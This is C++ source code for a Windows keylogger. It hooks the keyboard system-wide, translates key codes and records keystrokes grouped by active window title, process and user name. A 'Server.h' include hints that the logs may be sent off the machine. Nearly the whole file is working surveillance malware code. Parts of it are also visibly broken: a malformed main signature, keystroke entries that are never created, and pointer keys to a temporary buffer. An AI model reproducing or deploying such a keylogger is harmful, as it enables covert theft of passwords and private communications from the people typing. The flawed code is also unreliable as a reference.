#include "Server.h"
#include "Configuration.h"
#include "Log.h"
#include <Psapi.h>
#include <iostream>
#include <string>
#include <Lmcons.h>
#include <thread>
#include <map>

#define MAX_PATH 256					

typedef struct keylogger_log_struct {
	int pid;								/* Current window process ID */
	char* original_filename;				/* Current window executable name */
	char* exec_name;						/* Current window executable path */
	map<char*, string> keystrokes;			/* Keystrokes by window title dictionary */
	string date;							/* Last-modified date */
	char* uname;							/* Current user-name */
} LOG_STRUCT;

string getCurrentDate()
{
	time_t t = time(0);   // get time now
	char str_time[80];
	struct tm * now = localtime(&t);

	strftime(str_time, sizeof(str_time), "%d-%m-%Y %H:%M:%S", now);
	return (string(str_time));
}

vector<LOG_STRUCT> all_data;
string date = getCurrentDate();

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) 
{	
	PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT)(lParam);
	string char_string;
	char exe_name[MAX_PATH + 1], username[UNLEN + 1], wndw_title[MAX_PATH], *path;

	DWORD processid, username_len = UNLEN + 1;
	HANDLE window_proc;
	HWND hwnd = GetForegroundWindow(); // Gets a handler for the current window

	GetWindowThreadProcessId(hwnd, &processid);  // Retrieve current window process ID
	memset(exe_name, 0, sizeof(exe_name));
	window_proc = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_TERMINATE, FALSE, processid);
	GetWindowText(hwnd, wndw_title, sizeof(wndw_title));  // Retrieve current window title text
	GetModuleFileNameEx(window_proc, NULL, exe_name, MAX_PATH);  // Retrieve current window executable filename (@TODO:fix!)
	GetUserName(username, &username_len);  // Retrieve current user name
	CloseHandle(window_proc);

	string string_exe_name(exe_name);
	string process_name = string_exe_name.substr(string_exe_name.find_last_of('\\') + 1,
		string_exe_name.length() - 1);

	// Switch case the virtual key code 
	if (wParam == WM_KEYDOWN) {

		string key;
		switch (p->vkCode)
		{
			case VK_LSHIFT:							break;
			case VK_RSHIFT:							break;
			case VK_CAPITAL:	key = "[CAPLOCK]";	break;
			case VK_LCONTROL:	key = "[LCTRL]";	break;
			case VK_RCONTROL:	key = "[RCTRL]";	break;
			case VK_LWIN:		key = "[LWIN]";		break;
			case VK_RWIN:		key = "[RWIN]";		break;
			case VK_NUMPAD0:	key = "[0]";		break;
			case VK_NUMPAD1:	key = "[1]";		break;
			case VK_NUMPAD2:	key = "[2]";		break;
			case VK_NUMPAD3:	key = "[3]";		break;
			case VK_NUMPAD4:	key = "[4]";		break;
			case VK_NUMPAD5:	key = "[5]";		break;
			case VK_NUMPAD6:	key = "[6]";		break;
			case VK_NUMPAD7:	key = "[7]";		break;
			case VK_NUMPAD8:	key = "[8]";		break;
			case VK_NUMPAD9:	key = "[9]";		break;
			case VK_DIVIDE:		key = "[/]";		break;
			case VK_MULTIPLY:	key = "[*]";		break;
			case VK_ADD:		key = "[+]";		break;
			case VK_SUBTRACT:	key = "[-]";		break;
			case VK_SPACE:		key = " ";			break;
			case VK_SNAPSHOT:	key = "[PRTSCRN]";	break;
			case VK_INSERT:		key = "[INSERT]";	break;
			case VK_END:		key = "[END]";		break;
			case VK_PRINT:		key = "[PRINT]";	break;
			case VK_DELETE:		key = "[DEL]";		break;
			case VK_BACK:		key = "[BK]";		break;
			case VK_LMENU:		key = "[LALT]";		break;
			case VK_RMENU:		key = "[RALT]";		break;
			case VK_TAB:		key = "[TAB]";		break;
			case VK_RETURN:		key = "[ENTER]";	break;
			case VK_OEM_1:
				if (GetAsyncKeyState(VK_SHIFT)) { key = ":"; }
				else { key = ";"; }
				break;
			case VK_OEM_2:
				if (GetAsyncKeyState(VK_SHIFT)) { key = "?"; }
				else { key = "/"; }
				break;
			case VK_OEM_3:
				if (GetAsyncKeyState(VK_SHIFT)) { key = "~"; }
				else { key = "`"; }
				break;
			case VK_OEM_4:
				if (GetAsyncKeyState(VK_SHIFT)) { key = "{"; }
				else { key = "["; }
				break;
			case VK_OEM_5:
				if (GetAsyncKeyState(VK_SHIFT)) { key = "|"; }
				else { key = "\\"; }
				break;
			case VK_OEM_6:
				if (GetAsyncKeyState(VK_SHIFT)) { key = "}"; }
				else { key = "]"; }
				break;
			case VK_OEM_7:
				if (GetAsyncKeyState(VK_SHIFT)) { key = "\""; }
				else { key = "'"; }
				break;
			case VK_OEM_8:
				if (GetAsyncKeyState(VK_SHIFT)) { key = "?"; }
				else { key = "/"; }
				break;
			case VK_OEM_COMMA:
				if (GetAsyncKeyState(VK_SHIFT)) { key = "<"; }
				else { key = ","; }
				break;
			case VK_OEM_PERIOD:
				if (GetAsyncKeyState(VK_SHIFT)) { key = ">"; }
				else { key = "."; }
				break;
			case VK_OEM_MINUS:
				if (GetAsyncKeyState(VK_SHIFT)) { key = "_"; }
				else { key = "-"; }
				break;
			case VK_OEM_PLUS:
				if (GetAsyncKeyState(VK_SHIFT)) { key = "+"; }
				else { key = "= "; }
				break;

			default:
				if (GetKeyState(VK_CAPITAL) & 0x0001 != 0) 
					key = string(1, (char)(p->vkCode));
			
				else if (GetAsyncKeyState(VK_SHIFT) & (1 << 16))
				{
					if (p->vkCode == 48)	  { key = ")"; }
					else if (p->vkCode == 49) { key = "!"; }
					else if (p->vkCode == 50) { key = "@"; }
					else if (p->vkCode == 51) { key = "#"; }
					else if (p->vkCode == 52) { key = "$"; }
					else if (p->vkCode == 53) { key = "%"; }
					else if (p->vkCode == 54) { key = "^"; }
					else if (p->vkCode == 55) { key = "&"; }
					else if (p->vkCode == 56) { key = "*"; }
					else if (p->vkCode == 57) { key = "("; }
					else { key = string(1, (char)(p->vkCode)); }
				}
				else { key = string(1, (char)(p->vkCode + 32)); }
				break;
		}

		// Check if there's aleady a log struct for the current process (by process ID)
		for (auto all_data_iterator = all_data.begin(); all_data_iterator != all_data.end(); all_data_iterator++)
		{
			if (processid == all_data_iterator->pid)
			{
				all_data_iterator->date = getCurrentDate();  // Update last modified field to current date
				if (all_data_iterator->keystrokes.count(wndw_title) <= 0)	// If the key (window title) doesn't exist
					all_data_iterator->keystrokes.insert(pair<char*, string>(wndw_title, " "));
				try {
					all_data_iterator->keystrokes.at(wndw_title).append(key);  // Write key to struct
				}
				catch (std::length_error) 
				{
					fprintf(stderr, "Error writing to struct: keystrokes string exceeded MAX_SIZE!");
				}
			}
		}
	}

	return CallNextHookEx(NULL, nCode, wParam, lParam);  // Call next hook in the chain
}

int main(string logfile_location, int duration = 0)
{
	system("COLOR 1A");
	//Set windows hook
	HHOOK keyboardHook = SetWindowsHookEx(
		WH_KEYBOARD_LL,
		KeyboardProc,
		NULL,
		0);

	Sleep(1000); // pause for 1 second
	cout << "------------> Keylogger initialized" << endl;
	MessageBox(NULL, "Press OK to stop logging.", "Information", MB_OK);

	system("pause");
	UnhookWindowsHookEx(keyboardHook);
	exit(0);
}
